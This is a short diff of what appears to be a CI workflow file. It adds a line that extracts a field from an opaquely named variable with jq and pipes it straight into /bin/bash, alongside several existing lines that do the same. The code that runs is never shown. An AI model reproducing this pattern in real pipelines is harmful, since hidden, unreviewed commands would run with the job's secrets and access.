@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$wl65" | jq -r .mynl0 | /bin/bash
           printf '%s' "$bc8781" | jq -r .iead99 | /bin/bash
           printf '%s' "$b38747" | jq -r .pvolg6 | /bin/bash
+          echo $cj601 | jq -r .yugvc00685 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
